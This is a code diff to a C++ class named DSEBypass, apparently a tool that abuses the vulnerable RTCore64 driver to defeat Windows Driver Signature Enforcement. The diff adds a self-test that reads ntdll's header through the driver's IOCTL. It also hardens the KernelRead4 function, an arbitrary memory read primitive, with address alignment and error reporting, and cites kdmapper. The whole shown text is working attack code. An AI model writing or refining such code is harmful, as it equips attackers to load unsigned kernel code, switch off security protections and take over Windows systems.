@@ -211,6 +211,19 @@ bool DSEBypass::LoadRTCore(const std::wstring& sysPath) {
     }
 
     std::cout << "[+] RTCore64 loaded\n";
+
+    // Self-test: read our own process's PEB pointer via the known PEB offset in TEB.
+    // This is a user-mode address, so the driver must support user-mode VA reads too.
+    // More useful: read the first 2 bytes of ntdll.dll in user space as a known-good test.
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (hNtdll) {
+        ULONG testVal = KernelRead4((ULONG64)hNtdll);
+        std::cout << "[*] RTCore64 self-test: ntdll @ 0x" << std::hex << (ULONG64)hNtdll
+                  << " -> 0x" << testVal << std::dec
+                  << (((testVal & 0xFFFF) == 0x5A4D) ? " [MZ OK]" : " [unexpected - IOCTL may be broken]")
+                  << "\n";
+    }
+
     return true;
 }
 
@@ -238,10 +251,24 @@ void DSEBypass::UnloadRTCore() {
 // ---------------------------------------------------------------------------
 ULONG DSEBypass::KernelRead4(ULONG64 address) {
     RTCoreMemOp op = {};
-    op.Address = address;
+    op.Address = address & ~(ULONG64)3;
     op.Size    = 4;
+
     DWORD bytes = 0;
-    DeviceIoControl(m_hDevice, RTCORE_IOCTL_READ, &op, sizeof(op), &op, sizeof(op), &bytes, NULL);
+    // Use same buffer for input and output (matches kdmapper reference implementation)
+    BOOL ok = DeviceIoControl(m_hDevice, RTCORE_IOCTL_READ,
+                              &op, sizeof(op),
+                              &op, sizeof(op),
+                              &bytes, NULL);
+    if (!ok) {
+        static bool warned = false;
+        if (!warned) {
+            std::cerr << "[-] RTCore64 read IOCTL failed: " << GetLastError()
+                      << " (bytes=" << bytes << ")\n";
+            warned = true;
+        }
+        return 0;
+    }
     return op.Value;
 }
 
